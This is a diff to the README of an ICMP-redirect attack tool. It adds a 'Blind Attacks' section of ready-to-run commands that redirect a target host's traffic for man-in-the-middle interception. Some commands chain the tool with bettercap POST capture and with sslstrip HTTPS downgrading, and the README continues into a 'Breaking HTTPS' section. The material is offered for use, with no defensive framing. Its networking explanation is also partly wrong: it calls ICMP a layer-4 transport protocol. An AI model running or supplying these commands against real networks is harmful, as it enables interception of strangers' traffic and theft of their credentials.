@@ -25,6 +25,12 @@ EULA
 # Attack Technique
 1. This use ICMP TYPE 5 Attack, using IP Datagram of Transport Protocol used in Transport Layer 4 in OSI Model
 
+# Blind Attacks
+1.Perform ICMP Attack for Blind MITM Traffic Redirection
+- Example: ICMPAttack.py -v -i wlan0 -g 192.168.15.0 -t 192.168.15.18
+- Blind  : ICMPAttack.py -v -i wlan0 -g 192.168.15.0 -t 192.168.15.18 && bettercap -t 127.0.0.1 --proxy -P POST
+- Blind  : ICMPAttack.py -v -i wlan0 -g 192.168.15.0 -t 192.168.15.18 && sslstrip -a -k -l 8080 -i logs.txt
+
 # Breaking HTTPS
 1. This method works very well
 2. See traffic using localhost for PC
